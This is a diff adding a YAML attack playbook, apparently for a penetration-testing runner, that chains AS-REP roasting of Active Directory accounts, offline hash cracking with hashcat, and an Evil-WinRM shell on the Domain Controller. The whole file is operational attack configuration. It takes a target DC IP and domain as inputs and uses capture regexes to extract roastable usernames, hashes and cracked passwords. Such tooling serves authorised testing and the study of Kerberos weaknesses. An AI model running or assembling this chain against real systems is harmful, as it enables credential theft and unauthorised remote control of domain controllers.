@@ -1,0 +1,66 @@
+id: asrep-to-shell
+name: "AS-REP Roast → Crack → Evil-WinRM"
+description: >
+  Discover Active Directory accounts that have Kerberos pre-auth disabled,
+  harvest their AS-REP responses, crack them offline, and use the recovered
+  password to open an Evil-WinRM shell on the Domain Controller.
+tags: [kerberos, asreproast, credential-attack, lateral-movement, active-directory]
+difficulty: medium
+
+inputs:
+  - name: dc_ip
+    description: "Domain Controller IP."
+    source: target_context.ip
+    required: true
+  - name: domain
+    description: "Active Directory domain (e.g. corp.local)."
+    source: target_context.domain
+    required: true
+
+steps:
+  - id: enum_asrep_users
+    name: "Find AS-REP-roastable users"
+    command_ref: nxc-ldap-asreproasting
+    notes: |
+      Unauthenticated variant requires a users.txt wordlist. With any valid
+      LDAP-readable credential (even a low-priv account) the call returns
+      every account with DONT_REQ_PREAUTH set.
+    inputs:
+      dc-ip: "${dc_ip}"
+      output.txt: "asrep.hashes"
+    capture:
+      - var: asrep_hashes
+        regex: '\$krb5asrep\$.+'
+        match: all
+      - var: roastable_users
+        regex: '\$krb5asrep\$[0-9]+\$([A-Za-z0-9._-]+)@'
+        match: all
+
+  - id: crack_asrep
+    name: "Crack AS-REP hashes offline"
+    command_ref: hashcat-asrep
+    requires: [asrep_hashes]
+    inputs:
+      hash_file: "asrep.hashes"
+    capture:
+      - var: cracked_creds
+        regex: '^(\$krb5asrep\$[^:]+):(.+)$'
+        match: all
+        groups:
+          hash: 1
+          password: 2
+
+  - id: get_shell
+    name: "Authenticate with the cracked password"
+    command_ref: evil-winrm
+    requires: [cracked_creds]
+    notes: |
+      The runner shows the Evil-WinRM card with its built-in variations
+      (password / NTLM hash / Kerberos ticket). Pick the one matching what
+      you cracked. Most often this is the password path.
+
+references:
+  - title: "AS-REP Roasting — The Hacker Recipes"
+    url:   "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
+  - title: "Evil-WinRM"
+    url:   "https://github.com/Hackplayers/evil-winrm"
